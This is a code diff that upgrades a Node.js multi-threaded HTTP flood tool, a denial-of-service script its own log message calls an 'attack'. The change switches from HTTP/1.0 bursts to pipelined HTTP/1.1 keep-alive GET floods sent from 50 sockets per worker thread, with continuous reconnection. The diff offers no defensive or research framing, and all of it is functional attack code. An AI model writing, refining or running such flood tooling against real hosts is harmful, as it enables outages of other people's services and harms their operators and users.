@@ -14,7 +14,7 @@ if (isMainThread) {
     const targetUrl = new URL(process.argv[2]);
     const duration = parseInt(process.argv[3]);
 
-    console.log(`Launching HTTP/1.0 attack on ${targetUrl.hostname} for ${duration}s with ${THREADS} threads...`);
+    console.log(`Launching HTTP/1.1 attack on ${targetUrl.hostname} for ${duration}s with ${THREADS} threads...`);
 
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, { workerData: { hostname: targetUrl.hostname, port: targetUrl.port || 80, path: targetUrl.pathname || '/', duration } });
@@ -23,26 +23,33 @@ if (isMainThread) {
     const { hostname, port, path, duration } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function createRawFlood() {
+    function createH11Flood() {
         if (Date.now() > end) return;
 
         const socket = net.connect(port, hostname, () => {
-            const req = `GET ${path} HTTP/1.0\r\nHost: ${hostname}\r\n\r\n`;
-            for (let i = 0; i < 100; i++) {
-                socket.write(req);
-            }
+            const req = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`;
+            
+            let interval = setInterval(() => {
+                if (Date.now() > end || socket.destroyed) {
+                    clearInterval(interval);
+                    socket.destroy();
+                    return;
+                }
+                for (let i = 0; i < 100; i++) {
+                    socket.write(req);
+                }
+            }, 0);
         });
 
         socket.on('error', () => {});
         socket.on('close', () => {
-            setImmediate(createRawFlood);
+            setTimeout(createH11Flood, 10);
         });
 
         setTimeout(() => {
             socket.destroy();
-        }, 500); // close every 0.5s
+        }, 2000); // recycle socket every 2s
     }
 
-    // Create multiple raw connections per thread
-    for (let i = 0; i < 50; i++) createRawFlood();
+    for (let i = 0; i < 50; i++) createH11Flood();
 }
